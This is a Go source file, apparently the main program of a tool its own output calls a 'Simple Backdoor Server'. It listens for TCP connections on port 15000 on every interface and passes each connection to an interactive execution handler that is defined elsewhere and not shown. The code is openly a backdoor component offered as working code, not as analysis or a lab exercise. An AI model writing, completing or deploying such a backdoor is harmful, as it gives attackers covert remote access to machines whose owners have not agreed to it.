package main

import (
	"fmt"
	"github.com/sirupsen/logrus"
	"net"
	"sync/atomic"
)

const (
	//If empty then listen on all available interfaces
	CHOST = ""
	CPORT = "15000"
	CTYPE = "tcp4"
)

func main() {
	var connected int32 = 0
	listen, err := net.Listen(CTYPE, CHOST+":"+CPORT)
	if err != nil {
		logrus.Fatal(err)
	}
	defer listen.Close()

	fmt.Printf("Simple Backdoor Server Listening on %s:%s\n", CHOST, CPORT)

	for {
		conn, err := listen.Accept()
		if err != nil {
			logrus.Fatal(err)
		}
		atomic.AddInt32(&connected, 1)

		go NewLogger(NewInteract(conn, &connected)).Exec()
		logrus.Printf("nb Connected: %d", atomic.LoadInt32(&connected))
	}
}
